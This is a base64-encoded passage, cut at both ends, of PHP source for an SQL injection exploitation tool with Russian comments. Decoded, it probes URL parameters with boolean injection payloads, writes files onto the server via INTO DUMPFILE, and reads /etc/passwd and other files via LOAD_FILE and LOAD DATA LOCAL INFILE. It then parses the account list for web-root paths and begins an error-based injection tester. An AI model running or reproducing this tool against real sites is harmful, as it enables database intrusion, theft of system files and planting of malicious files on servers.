Jwg0J3QkNCl0J7QltCU0JXQndCY0K8gU1FMSSDQvdCwINC+0YHQvdC+0LLQtSDQsNC90LDQu9C40LfQsCDRgdC70L7Qsi8vLy8vLy8vLy8KCS8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vCgkKCWZ1bmN0aW9uIHVybE11bHRpQ2hlY2ttZXRob2QoJHVybD0nJyl7CgkJCgkJJHRoaXMtPmhlYWRlciA9IGZhbHNlOwoJCQoJCSR1cmxzID0gJHRoaXMtPnVybFBhcnNlVXJsKCR1cmwpOwoJCQoJCQoJCWZvcmVhY2ggKCR1cmxzIGFzICR1cmxfY2hlaykKCQl7CgkJCQoJCQkkY2hlayA9ICR0aGlzLT51cmxDaGVrTWV0aG9kKCR1cmxfY2hlayk7CgkJCQoJCQlpZigkY2hlayE9PWZhbHNlKQoJCQl7CgkJCQkkdGhpcy0+aGVhZGVyID0gdHJ1ZTsKCQkJCS8vcmV0dXJuIGFycmF5KCR1cmxfY2hlaywkY2hlayk7CgkJCQlyZXR1cm4gJ2Jvb2xlYW4nOwoJCQkJYnJlYWs7CgkJCX0KCQkJCgkJfQoJCQoJCSR0aGlzLT5oZWFkZXIgPSB0cnVlOwoJCXJldHVybiBmYWxzZTsKCQkKCX0KCQoJZnVuY3Rpb24gdXJsQ2hla01ldGhvZCgkdXJsKXsKCQkJCQoJCSR0aGlzLT51cmwgPSAkdXJsOwoJCSR0aGlzLT5tZXRob2QgPSBmYWxzZTsKCQkvLyR0aGlzLT5jb2x1bW4gPSBmYWxzZTsKCQkKCQkkdGhpcy0+bXlzcWxHZXRLZXl3b3JkKCk7CgkJCgkJLy8kdGhpcy0+ZCgkdGhpcy0+a2V5X3dvcmQsJyR0aGlzLT5rZXlfd29yZCcpOwoJCQoJCSR0aGlzLT5teXNxbEdldE1ldGhvZCgpOwoJCQoJCSR0aGlzLT5kKCR0aGlzLT5tZXRob2QsJyR0aGlzLT5tZXRob2QnKTsKCQkKCQlpZigkdGhpcy0+bXlzcWxDaGVLb25lYygkdXJsKT09ZmFsc2UpcmV0dXJuIEZBTFNFOwoJCQoJCQoJCQoJCWlmKCR0aGlzLT5tZXRob2Q9PT0wKXsKCSAgICAJcmV0dXJuICdpbnRlZ2VyJzsKCSAgICAJCgkgICAgCQoJICAgIH1lbHNlaWYgKCR0aGlzLT5tZXRob2Q9PTEpewoJICAgIAkKCSAgICAJcmV0dXJuICJzdHJpbmcoJykiOwoJICAgIAoJICAgIH1lbHNlaWYgKCR0aGlzLT5tZXRob2Q9PTIpewoJICAgIAkKCSAgICAJcmV0dXJuICdzdHJpbmcoIiknOwoJICAgIAkKCSAgICB9ZWxzZXsKCSAgICAJcmV0dXJuIGZhbHNlOwoJICAgIH0KCgkJZGllKCk7Cgl9CgkKCWZ1bmN0aW9uIG15c3FsR2V0S2V5d29yZCgpeyAvL9C40YnQtdGCINGD0L3QuNC6INGB0LvQvtCy0LAKCgkJCgkJJGNvbnQgPSAkdGhpcy0+Z2V0Q29udGVudHMoJHRoaXMtPnVybCk7CgkJLy8kdGhpcy0+ZCgkY29udCwnY29udC0nLiR0aGlzLT51cmwpOwoJCQoJCQoJCSRnZXQgPSAkdGhpcy0+Z2V0V29yZCgkY29udCk7CgkJLy8kdGhpcy0+ZCgkZ2V0LCdnZXQnKTsKCQkKCQkKCQkkY29udG51bGwgPSAkdGhpcy0+Z2V0Q29udGVudHMoJHRoaXMtPnVybC4iMjEyMTEyMTEyMTIxMi4xIik7CgkJLy8kdGhpcy0+ZCgkY29udG51bGwsJ2NvbnRudWxsLScuJHRoaXMtPnVybC4iMjEyMTEyMTEyMTIxMi4xIik7CgkJCgkJCgkJJGdldG51bGwgPSAkdGhpcy0+Z2V0V29yZCgkY29udG51bGwpOwoJCS8vJHRoaXMtPmQoJGdldG51bGwsJ2dldG51bGwnKTsKCQoJCQoJCQoJCSRyZXN1bHQgPSBhcnJheV9kaWZmKCRnZXQsJGdldG51bGwpOwoJCSRyZXN1bHQgPSBhcnJheV91bmlxdWUoJHJlc3VsdCk7CgkJLy8kdGhpcy0+ZCgkcmVzdWx0LCdyZXN1bHQnKTsKCQkKCQkJCgkJaWYoY291bnQoJHJlc3VsdCk9PTApewoJCQkKCQkJcmV0dXJuIGZhbHNlOwoJCX0KCQkKCQkKCQkkcmVzdWx0ID0gYXJyYXlfc2xpY2UoJHJlc3VsdCwwLDEpOyAKCQkvLyR0aGlzLT5kKCRyZXN1bHQsJ3Jlc3VsdCBzbGljZScpOwoJCQoJCSR0aGlzLT5rZXlfd29yZCA9ICRyZXN1bHRbMF07IAoJCS8vZWNobyAkcmVzdWx0OwoJCS8vZGllKCk7Cgl9CgkKCWZ1bmN0aW9uIG15c3FsR2V0TWV0aG9kKCl7Ly/RgSDRgNCw0LfQvdGL0LzQuCDQv9GA0LjRgdGC0LDQstC60Lgg0LDQvdCw0LvQuNC30LjRgNGD0LXRgiDQstGF0L7QttC00LXQvdC40LUg0YHQu9C+0LIsINC/0YDQvtCy0LXRgNC60LAg0L3QsCBzcWxpCgkJCgoJCWlmKGVtcHR5KCR0aGlzLT5rZXlfd29yZCkpcmV0dXJuIEZBTFNFOwoJCQoJCS8vLy8vLy8KCQkKCQkkc3RyaW5nWzBdICA9ICIrYW5kKzElM0QxIjsvLyBhbmQgMT0xCgkJJHN0cmluZ1sxXSAgPSAiK2FuZCsxJTNFMSI7Ly9hbmQgMT4xCgkJCgkJCgkJJHN0cjEgPSAkdGhpcy0+Z2V0Q29udGVudHMoJHRoaXMtPnVybC4kc3RyaW5nWzBdKTsKCQkkc3RyMiA9ICR0aGlzLT5nZXRDb250ZW50cygkdGhpcy0+dXJsLiRzdHJpbmdbMV0pOwoJCQoKCQkkaT0wOwoJCQoJCWlmKHN0cnN0cigkc3RyMSwgJHRoaXMtPmtleV93b3JkKSBBTkQgIXN0cnN0cigkc3RyMiwgJHRoaXMtPmtleV93b3JkKSkKCQl7CgkJCSRyZXp1cyA9IDA7CgkJfWVsc2UKCQl7CgkJCSRpKz0xOwoJCX0KCQkKCQkvL1NUUklOR0UKCQkKCQkkc3RyaW5nWzBdICA9ICIlMjcrYW5kKyUyN3glMjclM0QlMjd4IjsvLycgYW5kICd4Jz0neAoJCSRzdHJpbmdbMV0gID0gIiUyNythbmQrJTI3eCUyNyUzRCUyN3kiOy8vJyBhbmQgJ3gnPSd5CgkJCgkJJHN0cjEgPSAkdGhpcy0+Z2V0Q29udGVudHMoJHRoaXMtPnVybC4kc3RyaW5nWzBdKTsKCQkkc3RyMiA9ICR0aGlzLT5nZXRDb250ZW50cygkdGhpcy0+dXJsLiRzdHJpbmdbMV0pOwoKCQkKCQlpZihzdHJzdHIoJHN0cjEsICR0aGlzLT5rZXlfd29yZCkgQU5EICFzdHJzdHIoJHN0cjIsICR0aGlzLT5rZXlfd29yZCkpCgkJewoJCQkkcmV6dXMgPSAxOwoJCX1lbHNlCgkJewoJCQkkaSs9MTsKCQl9CgoJCQoJCgkJJHN0cmluZ1swXSAgPSAnIithbmQrIngiJTNEIngnOyAvLyIgYW5kICJ4Ij0ieAoJCSRzdHJpbmdbMV0gID0gJyUyMithbmQrJTIyeCUyMiUzRCUyMnknOy8vIiBhbmQgIngiPSJ5CgkJCgkJCgkJJHN0cjEgPSAkdGhpcy0+Z2V0Q29udGVudHMoJHRoaXMtPnVybC4kc3RyaW5nWzBdKTsKCQkkc3RyMiA9ICR0aGlzLT5nZXRDb250ZW50cygkdGhpcy0+dXJsLiRzdHJpbmdbMV0pOwoJCQoJCgkKCQlpZihzdHJzdHIoJHN0cjEsICR0aGlzLT5rZXlfd29yZCkgQU5EICFzdHJzdHIoJHN0cjIsICR0aGlzLT5rZXlfd29yZCkpCgkJewoJCQkkcmV6dXMgPSAyOwoJCX1lbHNlCgkJewoJCQkkaSs9MTsKCQl9CgkJCgkJCgkJaWYoJGk8MykKCQl7CQoJCQkkdGhpcy0+bWV0aG9kID0gJHJlenVzOwoJCQlyZXR1cm4gdHJ1ZTsKCQl9CgkJCgkJcmV0dXJuIEZBTFNFOwoKCX0KCQoJZnVuY3Rpb24gbXlzcWxDaGVLb25lYygkdXJsKXsKCQkKCQkkZmlsZSA9ICR0aGlzLT5nZXRDb250ZW50cygkdXJsLiR0aGlzLT5rb25lY19mb3JfY2hla1skdGhpcy0+bWV0aG9kXSk7CgoJCWlmKGVtcHR5KCR0aGlzLT5rZXlfd29yZCkpcmV0dXJuIGZhbHNlOwoJCQoJCWlmKHN0cnN0cigkZmlsZSwgJHRoaXMtPmtleV93b3JkKSlyZXR1cm4gdHJ1ZTsKCQkKCQlyZXR1cm4gZmFsc2U7Cgl9CgkKCWZ1bmN0aW9uIGdldFdvcmQoJGZpbGUpey8v0YTRg9C90LrRhtC40Y8g0L7RgtC00LDRkdGCINC+0LHRgNCw0YLQvdC+INGC0L7Qu9GM0LrQviDRh9C40YHRgtGL0Lkg0YLQtdC60YHRgiDQuCDQv9C+0LzQtdGJ0LDQtdGCINCyINC80LDRgdGB0LjQsiDRgSDRgNCw0LfQsdC40LLQutC+0Lkg0L/QviDQv9GA0L7QsdC10LvQsNC8CgkJCgkJCgkJLy88YnI+CgkKCQkkZmlsZSA9IHN0cl9yZXBsYWNlKGFycmF5KCInIiwnIicsIlxyIiwnLCcsJy4nLCctJywnPGJyPicsJzwvYnI+JyksICcgJywgJGZpbGUpOwoJCS8vcHJlZ19tYXRjaF9hbGwoIi9bXmEtekEtWtCwLdGP0JAt0K8wLTldL2lzIiwkZmlsZSwkd29yZCk7CgkJJGZpbGUgPSBleHBsb2RlKCcgJywgJGZpbGUpOwoJCXJldHVybiAkZmlsZTsKCQoJfQoJCgkJLy8vLy8vLy8vLy8vL0xPQURfRklMRS8vLy8vLy8vLy8vLy8vCgkKCWZ1bmN0aW9uIHVwbG9hZF9maWxlKCRjb2RlLCRmaWxlKXsKCQoJCQoJCSR0aGlzLT5kdW1wZmlsZSA9IHRydWU7CgoJCSR0aGlzLT53b3JrWzBdPTE7CgkJCgkJJGRhdGEgPSAkdGhpcy0+bXlzcWxHZXRWYWx1ZSgnJywnJywiJGNvZGUiLCRsaW1pdD0wLCRvcmRlcj1hcnJheSgpLCR3aGVyZT0iSU5UTyBEVU1QRklMRSAnJGZpbGUnIik7CgkJCgkJcmV0dXJuICRkYXRhOwoJCQoJCQoJCQoJfQoJCglmdW5jdGlvbiBteXNxbER1bXBlckZpbHRlcigkY29kZSl7CgkJCgkJLy8kY29kZSA9IHN0cl9yZXBsYWNlKCJDT05DQVQoQ0hBUigxMDAsMTAwLDEwMCksQ0hBUig5MSw4OCw5MyksIiwnJywkY29kZSk7CgkJLy8kY29kZSA9IHN0cl9yZXBsYWNlKCIsQ0hBUig5MSw4OCw4OCw5MykpIiwnJywkY29kZSk7CgkJJGNvZGUgPSBzdHJfcmVwbGFjZSgibGltaXQgMCwxIiwnJywkY29kZSk7CgkJJGNvZGUgPSBzdHJfcmVwbGFjZSgiICBJTlRPIiwnIElOVE8nLCRjb2RlKTsKCQkkY29kZSA9IHN0cl9yZXBsYWNlKCJDT05DQVQoQ0hBUigxMDAsMTAwLDEwMCksQ0hBUig5MSw4OCw5MyksIiwnJywkY29kZSk7CgkJJGNvZGUgPSBzdHJfcmVwbGFjZSgiLENIQVIoOTEsODgsODgsOTMpKSIsJycsJGNvZGUpOwoJCSRjb2RlID0gc3RyX3JlcGxhY2UoIkNIQVIoOTEsODgsOTMpLCIsJycsJGNvZGUpOwoJCSRjb2RlID0gc3RyX3JlcGxhY2UoIixDSEFSKDkxLDg4LDg4LDkzKSIsJycsJGNvZGUpOwoJCQoJCSRjb2RlID0gdHJpbSgkY29kZSk7CgkJcmV0dXJuICRjb2RlOwoJCQoJCQoJfQoJCglmdW5jdGlvbiBsb2FkX2ZpbGVfcHJpdigpewoJCQoJCQoJCSRkYXRhID0gJHRoaXMtPm15c3FsR2V0VmFsdWUoJ215c3FsJywndXNlcicsJ2ZpbGVfcHJpdicpOwoJCXJldHVybiAkZGF0YTsKCX0KCQoJZnVuY3Rpb24gbG9hZF9maWxlKCRwc3MpewoJCQoJJGRhdGEgPSAkdGhpcy0+bXlzcWxHZXRWYWx1ZSgnJywnJywiTE9BRF9GSUxFKCd7JHBzc30nKSIsJGxpbWl0PTAsJG9yZGVyPWFycmF5KCksJHdoZXJlPScnKTsKCQkKCQlyZXR1cm4gJGRhdGE7CgkJCgkJCgkJCgl9CgkKCWZ1bmN0aW9uIGxvYWRfZmlsZV9sb2NhbCgkcHNzKXsKCQkKCQkkcG9sZSA9ICJMT0FEIERBVEEgTE9DQUwgSU5GSUxFICd7JHBzc30nIElOVE8gVEFCTEUgcGVudGVzdCBGSUVMRFMgVEVSTUlOQVRFRCBCWSIuJyBcJ1xuXCcnOwoJCQoJCSR0aGlzLT5kKCRwb2xlLCckcG9sZScpOwoJCS8vZXhpdDsKCQkKCQkkZGF0YSA9ICR0aGlzLT5teXNxbEdldFZhbHVlKCcnLCcnLCRwb2xlLCRsaW1pdD0wLCRvcmRlcj1hcnJheSgpLCR3aGVyZT0nJyk7CgkJCgkJcmV0dXJuICRkYXRhOwoJCQoJCS8vTE9BRCBEQVRBIExPQ0FMIElORklMRSAnL2V0Yy9wYXNzd2QnCgkJCgl9CgkKCWZ1bmN0aW9uIGxvYWRfcGFzc3dkKCl7CgkJCgkJJGxvYWRfZiA9ICR0aGlzLT5sb2FkX2ZpbGUoJy9ldGMvcGFzc3dkJyk7CgkJCQoJCQoJCQkKCQlpZigkbG9hZF9mWyJMT0FEX0ZJTEUoJy9ldGMvcGFzc3dkJykiXSAhPScnKQoJCXsKCQkJCgkJCS8vJHRoaXMtPmQoJGxvYWRfZlsiTE9BRF9GSUxFKCcvZXRjL3Bhc3N3ZCcpIl0sJ2xvYWRfZiBkZWZhdWx0Jyk7CgkJfWVsc2UKCQl7CgkJCQoJCQkvLyR0aGlzLT5kKCdORVRVJywnbG9hZF9mJyk7CgkJCXJldHVybiBmYWxzZTsKCQl9CgkJJHBhc3N3ZCA9ICRsb2FkX2ZbIkxPQURfRklMRSgnL2V0Yy9wYXNzd2QnKSJdOwoJCQoJCSRwYXNzd2Rfb25lID0gZXhwbG9kZSgiXG4iLCRwYXNzd2QpOyAKCQkvLyR0aGlzLT5kKCRwYXNzd2Rfb25lLCckcGFzc3dkX29uZScpOwoJCQoJCWlmKGNvdW50KCRwYXNzd2Rfb25lKSA+IDUpCgkJewoJCQkKCgkJCSRwYXNzd2RfbmV3ID0gYXJyYXkoKTsKCQkKCQkJZm9yZWFjaCAoJHBhc3N3ZF9vbmUgYXMgJHBwcykKCQkJewoJCQkJCgkJCQkkcHNzID0gdHJpbSgkcHBzKTsKCQkJCQoJCQlpZighcHJlZ19tYXRjaCgiL3NodXRkb3dufHN5bmN8Y3JvbmpvYnxteXNxbHxyb290fG5naW54fG1xdWV1ZXxkYWVtb258Y2xhbWF2fHNwb29sL2kiLCRwc3MpKXsKCQkJCQkKCQkJCQkKCQkJCQkkcHNzID0gc3RyX3JlcGxhY2UoIjovYmluL2Jhc2giLCcnLCRwc3MpOwoJCQkJCSRwc3MgPSBzdHJfcmVwbGFjZSgiOjoiLCc6JywkcHNzKTsKCQkJCQkkcHNzID0gc3RyX3JlcGxhY2UoIjovYmluL3NoIiwnOicsJHBzcyk7CgkJCQkJJHBzcyA9IHN0cl9yZXBsYWNlKCI6L3NiaW4vaGFsdCIsJzonLCRwc3MpOwoJCQkJCSRwc3MgPSBzdHJfcmVwbGFjZSgiOi9iaW4vZmFsc2UiLCc6JywkcHNzKTsKCQkJCQkkcHNzID0gc3RyX3JlcGxhY2UoIjovc2Jpbi9zaCIsJzonLCRwc3MpOwoJCQkJCSRwc3MgPSBzdHJfcmVwbGFjZSgiOi9zYmluL2Jhc2giLCc6JywkcHNzKTsKCQkJCQkkcHNzID0gc3RyX3JlcGxhY2UoIjovc2Jpbi9ub2xvZ2luIiwnOicsJHBzcyk7CgkJCQkJCgkJCQkJCgkJCQkJJHBzc19vbmUgPSBleHBsb2RlKCI6IiwkcHNzKTsKCQkJCQkKCQkJCQkKCQkJCQkKCQkJCQkKCQkJCS8vCSR0aGlzLT5kKCRwc3Nfb25lLCckcHNzX29uZScpOwoJCQkJCQoJCQkJCSRsbGw2ID0gCSRwc3Nfb25lWzZdOwoJCQkJCSRwcF9uZXc2ID0gZXhwbG9kZSgnLycsJHBzc19vbmVbNl0pOwoJCQkJCQoJCQkJCWlmKHByZWdfbWF0Y2goIi92YXJ8aG9tZXx1c3J8bW50fG9wdHxuZnMvaSIsJHBzc19vbmVbNl0pIGFuZCAgJHBzc19vbmVbNl0gIT0nJyBBTkQgY291bnQoJHBwX25ldzYpID4gMSApCgkJCQkJewoJCQkJCQkJCgkJCQkJCS8vJHRoaXMtPmQoJHBzc19vbmVbNl0sJyRwc3Nfb25lNicpOwoJCQkJCQkKCQkJCQkJaWYoY291bnQoJHBwX25ldzYpID4gMyApCgkJCQkJCXsKCQkJCQkJCSRwYXNzd2RfbmV3W10gPSAkcHBfbmV3NlswXS4iLyIuJHBwX25ldzZbMV0uIi8iLiRwcF9uZXc2WzJdLiIvIi4kcHBfbmV3NlszXTsKCQkJCQkJfQoJCQkJCQkKCQkJCQkJaWYoY291bnQoJHBwX25ldzYpID4gNCApCgkJCQkJCXsKCQkJCQkJCSRwYXNzd2RfbmV3W10gPSAkcHBfbmV3NlswXS4iLyIuJHBwX25ldzZbMV0uIi8iLiRwcF9uZXc2WzJdLiIvIi4kcHBfbmV3NlszXS4iLyIuJHBwX25ldzZbNF07CgkJCQkJCX0KCQkJCQkJCgkJCQkJCWlmKGNvdW50KCRwcF9uZXc2KSA+IDUgKQoJCQkJCQl7CgkJCQkJCQkkcGFzc3dkX25ld1tdID0gJHBwX25ldzZbMF0uIi8iLiRwcF9uZXc2WzFdLiIvIi4kcHBfbmV3NlsyXS4iLyIuJHBwX25ldzZbM10uIi8iLiRwcF9uZXc2WzRdLiIvIi4kcHBfbmV3Nls1XTsKCQkJCQkJfQoJCQkJCQkKCQkJCQkJaWYoY291bnQoJHBwX25ldzYpID4gNiApCgkJCQkJCXsKCQkJCQkJCSRwYXNzd2RfbmV3W10gPSAkcHBfbmV3NlswXS4iLyIuJHBwX25ldzZbMV0uIi8iLiRwcF9uZXc2WzJdLiIvIi4kcHBfbmV3NlszXS4iLyIuJHBwX25ldzZbNF0uIi8iLiRwcF9uZXc2WzVdLiIvIi4kcHBfbmV3Nls2XTsKCQkJCQkJfQoJCQkJCQkKCQkJCQkJCgkJCQkJCQoJCQkJCQkJCgkJCQkJCQkkcGFzc3dkX25ld1tdID0gJGxsbDY7CgkJCQkJCQkJCQkJCQoJCQkJCQkKCQkJCQl9CgkJCQkJCgkJCQkJCgkJCQkKCQkJCQkKCQkJCQkKCQkJCQkKCQkJCQkkbGxsNSA9IAkkcHNzX29uZVs1XTsKCQkJCQkkcHBfbmV3MCA9IGV4cGxvZGUoJy8nLCRwc3Nfb25lWzVdKTsKCQkJCQkKCQkJCQlpZihwcmVnX21hdGNoKCIvdmFyfGhvbWV8dXNyfG1udHxvcHR8bmZzL2kiLCRwc3Nfb25lWzVdKSBhbmQgICRwc3Nfb25lWzVdICE9JycgQU5EIGNvdW50KCRwcF9uZXcwKSA+IDEgKQoJCQkJCXsKCQkJCQkJCQoJCQkJCS8vCSR0aGlzLT5kKCRwc3Nfb25lWzVdLCckcHNzX29uZTUnKTsKCQkJCQkJCgkJCQkJCWlmKGNvdW50KCRwcF9uZXcwKSA+IDMgKQoJCQkJCQl7CgkJCQkJCQkkcGFzc3dkX25ld1tdID0gJHBwX25ldzBbMF0uIi8iLiRwcF9uZXcwWzFdLiIvIi4kcHBfbmV3MFsyXS4iLyIuJHBwX25ldzBbM107CgkJCQkJCX0KCQkJCQkJCgkJCQkJCWlmKGNvdW50KCRwcF9uZXcwKSA+IDQgKQoJCQkJCQl7CgkJCQkJCQkkcGFzc3dkX25ld1tdID0gJHBwX25ldzBbMF0uIi8iLiRwcF9uZXcwWzFdLiIvIi4kcHBfbmV3MFsyXS4iLyIuJHBwX25ldzBbM10uIi8iLiRwcF9uZXcwWzRdOwoJCQkJCQl9CgkJCQkJCQoJCQkJCQlpZihjb3VudCgkcHBfbmV3MCkgPiA1ICkKCQkJCQkJewoJCQkJCQkJJHBhc3N3ZF9uZXdbXSA9ICRwcF9uZXcwWzBdLiIvIi4kcHBfbmV3MFsxXS4iLyIuJHBwX25ldzBbMl0uIi8iLiRwcF9uZXcwWzNdLiIvIi4kcHBfbmV3MFs0XS4iLyIuJHBwX25ldzBbNV07CgkJCQkJCX0KCQkJCQkJCgkJCQkJCWlmKGNvdW50KCRwcF9uZXcwKSA+IDYgKQoJCQkJCQl7CgkJCQkJCQkkcGFzc3dkX25ld1tdID0gJHBwX25ldzBbMF0uIi8iLiRwcF9uZXcwWzFdLiIvIi4kcHBfbmV3MFsyXS4iLyIuJHBwX25ldzBbM10uIi8iLiRwcF9uZXcwWzRdLiIvIi4kcHBfbmV3MFs1XS4iLyIuJHBwX25ldzBbNl07CgkJCQkJCX0KCQkJCQkJCgkJCQkJCQoJCQkJCQkKCQkJCQkJCSRwYXNzd2RfbmV3W10gPSAkbGxsNTsKCQkJCQkJCgkJCQkJCQoJCQkJCQkKCQkJCQl9CgkJCQkJCgkJCQkJCgkJCQkKCQkJCQkKCQkJCQkKCQkJCQkKCQkJCQkkbGxsNCA9IAkkcHNzX29uZVs0XTsKCQkJCQkkcHBfbmV3NCA9IGV4cGxvZGUoJy8nLCRsbGw0KTsKCQkJCQkKCQkJCQlpZihwcmVnX21hdGNoKCIvdmFyfGhvbWV8dXNyfG1udHxvcHR8bmZzLyIsJHBzc19vbmVbNF0pIEFORCAkcHNzX29uZVs0XSAhPScnIEFORCBjb3VudCgkcHBfbmV3NCkgPiAxICkKCQkJCQl7CgkJCQkJCgkJCQkJCS8vJHRoaXMtPmQoJHBzc19vbmVbNF0sJyRwc3Nfb25lNCcpOwoJCQkJCQkKCQkJCQkJaWYoY291bnQoJHBwX25ldzQpID4gMyApCgkJCQkJCXsKCQkJCQkJCSRwYXNzd2RfbmV3W10gPSAkcHBfbmV3NFswXS4iLyIuJHBwX25ldzRbMV0uIi8iLiRwcF9uZXc0WzJdLiIvIi4kcHBfbmV3NFszXTsKCQkJCQkJfQoJCQkJCQkKCQkJCQkJaWYoY291bnQoJHBwX25ldzQpID4gNCApCgkJCQkJCXsKCQkJCQkJCSRwYXNzd2RfbmV3W10gPSAkcHBfbmV3NFswXS4iLyIuJHBwX25ldzRbMV0uIi8iLiRwcF9uZXc0WzJdLiIvIi4kcHBfbmV3NFszXS4iLyIuJHBwX25ldzRbNF07CgkJCQkJCX0KCQkJCQkJCgkJCQkJCWlmKGNvdW50KCRwcF9uZXc0KSA+IDUgKQoJCQkJCQl7CgkJCQkJCQkkcGFzc3dkX25ld1tdID0gJHBwX25ldzRbMF0uIi8iLiRwcF9uZXc0WzFdLiIvIi4kcHBfbmV3NFsyXS4iLyIuJHBwX25ldzRbM10uIi8iLiRwcF9uZXc0WzRdLiIvIi4kcHBfbmV3NFs1XTsKCQkJCQkJfQoJCQkJCQkKCQkJCQkJCgkJCQkJCWlmKGNvdW50KCRwcF9uZXc0KSA+IDYgKQoJCQkJCQl7CgkJCQkJCQkkcGFzc3dkX25ld1tdID0gJHBwX25ldzRbMF0uIi8iLiRwcF9uZXc0WzFdLiIvIi4kcHBfbmV3NFsyXS4iLyIuJHBwX25ldzRbM10uIi8iLiRwcF9uZXc0WzRdLiIvIi4kcHBfbmV3NFs1XS4iLyIuJHBwX25ldzRbNl07CgkJCQkJCX0KCQkJCQkJCgkJCQkJCQoJCQkJCQkJJHBhc3N3ZF9uZXdbXSA9ICRsbGw0OwoJCQkJCQkKCQkJCQl9CgkJCQkJCgkJCQkJCgkJCQkJCgkJCQkJJGxsbDMgPSAJJHBzc19vbmVbM107CgkJCQkJJHBwX25ldzMgPSBleHBsb2RlKCcvJywkcHNzX29uZVszXSk7CgkJCQkJCgkJCQkJCgkJCQkJaWYocHJlZ19tYXRjaCgiL3Zhcnxob21lfHVzcnxtbnR8b3B0fG5mcy9pIiwkcHNzX29uZVszXSkgYW5kICAkcHNzX29uZVszXSAhPScnIEFORCBjb3VudCgkcHBfbmV3MykgPiAxICkKCQkJCQl7CgkJCQkJCQkKCQkJCQkJLy8kdGhpcy0+ZCgkcHNzX29uZVszXSwnJHBzc19vbmUzJyk7CgkJCQkJCQoJCQkJCQlpZihjb3VudCgkcHBfbmV3MykgPiAzICkKCQkJCQkJewoJCQkJCQkJJHBhc3N3ZF9uZXdbXSA9ICRwcF9uZXczWzBdLiIvIi4kcHBfbmV3M1sxXS4iLyIuJHBwX25ldzNbMl0uIi8iLiRwcF9uZXczWzNdOwoJCQkJCQl9CgkJCQkJCQoJCQkJCQlpZihjb3VudCgkcHBfbmV3MykgPiA0ICkKCQkJCQkJewoJCQkJCQkJJHBhc3N3ZF9uZXdbXSA9ICRwcF9uZXczWzBdLiIvIi4kcHBfbmV3M1sxXS4iLyIuJHBwX25ldzNbMl0uIi8iLiRwcF9uZXczWzNdLiIvIi4kcHBfbmV3M1s0XTsKCQkJCQkJfQoJCQkJCQkKCQkJCQkJaWYoY291bnQoJHBwX25ldzMpID4gNSApCgkJCQkJCXsKCQkJCQkJCSRwYXNzd2RfbmV3W10gPSAkcHBfbmV3M1swXS4iLyIuJHBwX25ldzNbMV0uIi8iLiRwcF9uZXczWzJdLiIvIi4kcHBfbmV3M1szXS4iLyIuJHBwX25ldzNbNF0uIi8iLiRwcF9uZXczWzVdOwoJCQkJCQl9CgkJCQkJCQoJCQkJCQlpZihjb3VudCgkcHBfbmV3MykgPiA2ICkKCQkJCQkJewoJCQkJCQkJJHBhc3N3ZF9uZXdbXSA9ICRwcF9uZXczWzBdLiIvIi4kcHBfbmV3M1sxXS4iLyIuJHBwX25ldzNbMl0uIi8iLiRwcF9uZXczWzNdLiIvIi4kcHBfbmV3M1s0XS4iLyIuJHBwX25ldzNbNV0uIi8iLiRwcF9uZXczWzZdOwoJCQkJCQl9CgkJCQkJCQoJCQkJCQkKCQkJCQkJCgkJCQkJCQkkcGFzc3dkX25ld1tdID0gJGxsbDM7CgkJCQkJCQoJCQkJCQkKCQkJCQkJCgkJCQkJfQoJCQkJCQoJCQkJCQoJCQkJfQoJCQl9CgkJCQoJCQkkcGFzc3dkX25ldyA9IGFycmF5X3VuaXF1ZSgkcGFzc3dkX25ldyk7CgkJCS8vJHRoaXMtPmQoJHBhc3N3ZF9uZXcsJyRwYXNzd2RfbmV3Jyk7CgkJCXJldHVybiAkcGFzc3dkX25ldzsKCQkJCQoJCX0KCX0KCQoJZnVuY3Rpb24gbG9hZF9wYXNzd2RfZGVmKCl7CgkJCgkJcmV0dXJuICR0aGlzLT5sb2FkX2ZpbGUoJy9ldGMvcGFzc3dkJyk7Cgl9CgkKCQoJCgkvLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vCgkvLy8vLy8vLy8vLy8vLy8vL9Cf0LXRgNCy0L7QvdCw0YfQsNC70YzQvdC+0LUg0YLQtdGB0YLQuNGA0L7QstCw0L3QuNC1IEVycm9yRmluZGVyLy8vLy8vLy8KCS8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8KCWZ1bmN0aW9uIGlual90ZXN0KCR2YWx1ZT0nJywkc2xlZXA9dHJ1ZSl7IC8v0L/RgNC10LTQstCw0YDQuNGC0LXQu9GM0L3QsNGPINGE0YPQutC90YbQuNGPINC60L7RgtC+0YDQsNGPINGA0LDQt9Cx0YDQsNGB0YvQstCw0LXRgiDQutGD0LTQsCDQuNC00LXRgiDQt9Cw0L/RgNC+0YEKCQoJCgkJJHRoaXMtPmNoZWNrX2h0dHBzKCR2YWx1ZSwkdGhpcy0+aF9zKTsKCQkkdmFsdWUgPSAkdGhpcy0+ZmlsdGVyX3VybCgkdmFsdWUpOwoJCQoJCWlmKCR0aGlzLT5jaGVja19oZWFkKCR2YWx1ZSk9PXRydWUpCgkJewoJCQkkcmVzID0gJHRoaXMtPmlual90ZXN0X2hlYWQoJycsJHRoaXMtPmhfcyk7CgkJCXJldHVybiAkcmVzOwoJCX1lbHNlCgkJewoJCQkKCQkJJHJlcyA9ICR0aGlzLT5pbmpfdGVzdF9nZXQoJHZhbHVlKTsKCQkJcmV0dXJuICRyZXM7CgkKCQkJCgkJfQoJCgl9CgkKCWZ1bmN0aW9uIGlual90ZXN0X2dldCgkdmFsdWU9JycsJHNsZWVwPXRydWUpeyAvLyBlcnJvckZpbmRlciDQv9C10YDQstC+0L3QsNGH0LDQu9GM0L3QsNGPINC/0YDQvtCy0LXRgNC60LAg0L3QsCDQvtGI0LjQsdC60LggbXNzcWwgbXlzcWwKCQkKCQkKCQkKCQkkdmFsdWVfb3JpZyA9ICR2YWx1ZTsKCQkKCgkJJHRoaXMtPnZhbHVlX29yaWc9JHZhbHVlOwoJCSR2YWx1ZV9vcmlnID0gJHZhbHVlOwoJCSRkID0gJHZhbHVlOwoJCSRkID0gc3RyX3JlcGxhY2UoJyZhbXA7JywgIiYiLCAkZCk7CgkJJGQgLj0gIidcIiI7CgkJJGQgPSBzdHJfcmVwbGFjZSgiJiIsIicmIiwkZCk7CgkJCQoJCQoJCQoJCgkJCgkJCQoJCWlmIChwcmVnX21hdGNoKCcvXC5hc3B8XC5jZm0vc2kn